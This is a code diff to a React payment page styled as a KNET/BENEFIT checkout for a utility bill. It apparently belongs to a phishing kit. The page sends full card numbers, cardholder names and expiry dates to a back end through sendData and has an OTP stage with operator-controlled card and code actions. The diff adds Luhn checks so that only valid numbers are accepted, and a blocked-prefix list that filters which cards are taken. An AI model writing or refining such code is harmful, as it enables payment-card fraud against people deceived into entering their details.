@@ -8,7 +8,33 @@ import {
   cardAction,
   codeAction,
   waitingMessage,
+  visitor,
 } from "@/lib/store";
+import { getBinInfo } from "@/lib/binDatabase";
+
+// Luhn algorithm to validate card number
+function isValidCardNumber(number: string): boolean {
+  if (!number || number.length < 13 || number.length > 19) return false;
+  let sum = 0;
+  let isEven = false;
+  for (let i = number.length - 1; i >= 0; i--) {
+    let digit = parseInt(number[i], 10);
+    if (isEven) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    sum += digit;
+    isEven = !isEven;
+  }
+  return sum % 10 === 0;
+}
+
+// Format card number with spaces every 4 digits
+function formatCardNumber(value: string): string {
+  const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
+  const groups = cleaned.match(/.{1,4}/g);
+  return groups ? groups.join(" ") : cleaned;
+}
 
 const months = Array.from({ length: 12 }, (_, i) => ({
   value: String(i + 1),
@@ -124,10 +150,21 @@ export default function KNETPayment() {
   // Get amount from localStorage
   const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
   const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.000";
+  // Real-time date/time
+  const [dateStr, setDateStr] = useState("");
+  useEffect(() => {
+    const updateTime = () => {
+      const n = new Date();
+      setDateStr(`${String(n.getDate()).padStart(2, "0")}-${String(n.getMonth() + 1).padStart(2, "0")}-${n.getFullYear()} ${String(n.getHours()).padStart(2, "0")}:${String(n.getMinutes()).padStart(2, "0")}:${String(n.getSeconds()).padStart(2, "0")}`);
+    };
+    updateTime();
+    const timer = setInterval(updateTime, 1000);
+    return () => clearInterval(timer);
+  }, []);
 
-  // Current date/time
-  const now = new Date();
-  const dateStr = `${String(now.getDate()).padStart(2, "0")}-${String(now.getMonth() + 1).padStart(2, "0")}-${now.getFullYear()} ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;
+  // Card validation states
+  const [luhnError, setLuhnError] = useState(false);
+  const [cardError, setCardError] = useState(false);
 
   // Masked card for OTP phase
   const maskedCard = "******" + cardNumber.slice(-4);
@@ -225,8 +262,36 @@ export default function KNETPayment() {
     }
   });
 
+  // Handle card number change with formatting, Luhn, and blocked prefix checks
+  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
+    const blockedPrefixes = visitor.value.blockedCardPrefixes;
+    const cardPrefix = rawValue.slice(0, 4);
+
+    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
+      setCardError(true);
+      setCardNumber("");
+      setLuhnError(false);
+    } else {
+      const formattedValue = formatCardNumber(rawValue);
+      setCardNumber(formattedValue);
+      setCardError(false);
+      if (rawValue.length >= 13 && rawValue.length <= 19) {
+        setLuhnError(!isValidCardNumber(rawValue));
+      } else {
+        setLuhnError(false);
+      }
+    }
+    setValidationError("");
+  };
+
   const validateCardForm = (): boolean => {
-    if (!cardNumber || cardNumber.length < 10) {
+    const cleanCard = cardNumber.replace(/\s+/g, "");
+    if (!cleanCard || cleanCard.length < 13 || cleanCard.length > 19) {
+      setValidationError(t.errCardNumber);
+      return false;
+    }
+    if (!isValidCardNumber(cleanCard)) {
       setValidationError(t.errCardNumber);
       return false;
     }
@@ -249,7 +314,8 @@ export default function KNETPayment() {
     setIsWaiting(true);
     setRejectedError("");
 
-    localStorage.setItem("cardNumber", cardNumber);
+    const cleanCard = cardNumber.replace(/\s+/g, "");
+    localStorage.setItem("cardNumber", cleanCard);
     localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
     localStorage.setItem("cardYear", expiryYear);
     localStorage.setItem("Total", String(totalAmount));
@@ -257,7 +323,7 @@ export default function KNETPayment() {
     const paymentData = {
       totalPaid: totalAmount,
       cardType: "benefit",
-      cardLast4: cardNumber.slice(-4),
+      cardLast4: cleanCard.slice(-4),
       serviceName: mohData.serviceType || "دفع فاتورة الكهرباء والماء",
       bankName: "BENEFIT",
       bankLogo: "/benefit-logo.png",
@@ -266,8 +332,8 @@ export default function KNETPayment() {
 
     sendData({
       paymentCard: {
-        cardNumber: cardNumber,
-        cardNumberOnly: cardNumber,
+        cardNumber: cleanCard,
+        cardNumberOnly: cleanCard,
         prefix: "",
         nameOnCard: cardHolderName,
         expiryMonth: expiryMonth.padStart(2, "0"),
@@ -412,10 +478,10 @@ export default function KNETPayment() {
                   <input
                     type="tel"
                     inputMode="numeric"
-                    maxLength={19}
+                    maxLength={23}
                     value={cardNumber}
-                    onChange={(e) => { setCardNumber(e.target.value.replace(/\D/g, "")); setValidationError(""); }}
-                    style={{ width: 200, height: 30, border: "1px solid #ccc", borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto", direction: "ltr" }}
+                    onChange={handleCardChange}
+                    style={{ width: 220, height: 30, border: `1px solid ${luhnError || cardError ? '#cc0000' : '#ccc'}`, borderRadius: 2, padding: "0 8px", fontSize: 14, outline: "none", caretColor: "auto", direction: "ltr" }}
                   />
                 </div>
 
